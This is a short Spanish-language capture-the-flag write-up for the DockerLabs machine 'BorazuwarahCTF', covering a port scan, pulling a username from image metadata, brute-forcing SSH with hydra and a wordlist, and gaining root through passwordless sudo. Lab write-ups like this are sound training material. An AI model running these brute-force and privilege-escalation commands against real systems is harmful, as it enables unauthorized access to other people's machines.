# DockerLabs - BorazuwarahCTF
## Resumen
* **Dificultad:** Muy facil
* **Tiempo:** ~15 minutos
* **Fecha:** 22/04/26
## Escaneo de puertos
Ejecutamos ```nmap``` para ver que puertos estan abiertos.
```bash
nmap -sCV 172.17.0.2
```
| Puerto | Servicio | Version |
|--------|--------|-------|
| 22 | SSH | OpenSSH 9.2p1 |
| 80 | HTTP | httpd 2.4.59 |
## Visualizacion de la web
Entramos por web a la direccion ```http://172.17.0.2```, dentro de aqui vemos que solo hay una foto de un huevo kinder. Nos guardamos la foto en el escritorio.
Ahora, con exiftool vemos la metadata de la foto.
```bash
exiftool image.jpeg
```
En parte de la metada sale ```user: borazuwarah``` pero la contraseña en blanco.
## Ataque por fuerza bruta a SSH
Con ```hydra``` intentamos sacar la contraseña del usuario ```borazuwarah``` por fuerza bruta.
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Nos dice que la contraseña es ```123456```
Una vez tenemos la contraseña ya podemos acceder a ssh.
```bash
ssh borazuwarah@172.17.0.2
# Password: 123456
```
## Escalada de privilegios 
Ejecutamos ```sudo -l``` para ver que permisos tenemos.
El usuario ```borazuwarah``` puede ejecutar ```/bin/bash``` sin passwd.
```bash
sudo bash
```
Maquina resuelta - Se accede a root.
